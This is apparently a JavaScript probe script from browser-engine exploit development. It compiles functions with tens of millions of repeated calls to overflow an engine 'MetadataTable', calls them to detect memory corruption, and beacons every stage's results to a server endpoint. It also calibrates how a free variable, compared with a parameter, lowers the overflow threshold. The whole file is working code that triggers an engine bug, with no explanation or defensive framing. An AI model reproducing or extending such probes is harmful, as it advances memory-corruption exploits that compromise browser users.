// p135 — MetadataTable overflow: free variable vs parameter calibration
// When 'a' is a PARAMETER → only op_call metadata (~96-128B per stmt)
// When 'b' is a FREE VARIABLE → resolve_scope + get_from_scope + call (~160-192B)
// Free var lowers overflow threshold from ~33-44M to ~22-27M.
// Beacon prefix: V135F-
(function(){
var rid='v135f'+Math.random().toString(36).slice(2,12);
function beacon(tag,data){
  var body=typeof data==='object'?JSON.stringify(data):String(data);
  try{navigator.sendBeacon('/beacon/V135F-'+tag,JSON.stringify({r:rid,b:body}));}catch(e){}
  try{fetch('/beacon/V135F-'+tag,{method:'POST',body:JSON.stringify({r:rid,b:body}),keepalive:true}).catch(function(){});}catch(e2){}
}
beacon('L','probe135-start');

function gcFlush(){
  for(var g=0;g<30;g++){var t=new ArrayBuffer(4194304);t=null;}
}

// Setup: define 'b' as a GLOBAL function (free variable for new Function('',..))
var cc=0;
window.b=function(){cc++;if(cc>10)throw new Error('P135S');};

// Phase 1: Free variable tests — 'b' is NOT a parameter
// Each b(); generates resolve_scope + get_from_scope + call
var tests=[
  // Free var tests (target)
  {name:'FV-20M',n:20000000,pat:'b();',mode:'fv'},
  {name:'FV-21M',n:21000000,pat:'b();',mode:'fv'},
  {name:'FV-22M',n:22000000,pat:'b();',mode:'fv'},
  // Parameter tests (calibration baseline)
  {name:'PM-20M',n:20000000,pat:'a();',mode:'pm'},
  {name:'PM-22M',n:22000000,pat:'a();',mode:'pm'},
  {name:'PM-24M',n:24000000,pat:'a();',mode:'pm'}
];

async function runAll(){
  for(var t=0;t<tests.length;t++){
    var test=tests[t];
    var r={n:test.n,mode:test.mode};
    beacon(test.name+'-PRE','n='+test.n);
    var t0=Date.now();
    try{
      // Build string
      beacon(test.name+'-STR','building');
      var src=test.pat.repeat(test.n);
      r.srcLen=src.length;
      r.srcTime=Date.now()-t0;
      beacon(test.name+'-STR-OK','len='+src.length);

      // Compile
      beacon(test.name+'-CMP','compiling');
      var t1=Date.now();
      try{
        var fn;
        if(test.mode==='fv'){
          fn=new Function('',src);  // 'b' is free variable
        }else{
          fn=new Function('a',src); // 'a' is parameter
        }
        r.compileTime=Date.now()-t1;
        r.compiled=true;
        beacon(test.name+'-CMP-OK','ms='+r.compileTime);

        // Free source immediately
        src=null;
        gcFlush();

        // Call — detect overflow corruption
        beacon(test.name+'-CALL','calling');
        cc=0;
        var pcc=0;
        try{
          if(test.mode==='fv'){
            fn();
          }else{
            fn(function(){pcc++;if(pcc>10)throw new Error('P135S');});
          }
        }catch(e){
          var stopErr=(e.message==='P135S');
          if(stopErr){
            r.callOK=true;
          }else{
            r.callErr=e.constructor.name+':'+String(e.message||'').slice(0,200);
            r.possibleCorruption=(e.constructor.name!=='Error'&&e.constructor.name!=='ReferenceError'&&e.constructor.name!=='TypeError');
          }
        }
        r.callCount=test.mode==='fv'?cc:pcc;
        beacon(test.name+'-CALL-RES','cc='+r.callCount+',ok='+!!r.callOK+',err='+(r.callErr||'none')+',corrupt='+!!r.possibleCorruption);
        fn=null;
      }catch(e){
        r.compileTime=Date.now()-t1;
        r.compileErr=e.constructor.name+':'+String(e.message||'').slice(0,200);
        beacon(test.name+'-CMP-ERR',r.compileErr);
        src=null;
      }
    }catch(e){
      r.srcErr=e.constructor.name+':'+String(e.message||'').slice(0,200);
      beacon(test.name+'-STR-ERR',r.srcErr);
    }
    r.totalTime=Date.now()-t0;
    beacon(test.name,JSON.stringify(r).slice(0,800));
    fn=null;src=null;
    gcFlush();
    await new Promise(function(resolve){setTimeout(resolve,10000);});
    gcFlush();
  }
  beacon('DONE','all-'+tests.length);
}
runAll();
})();
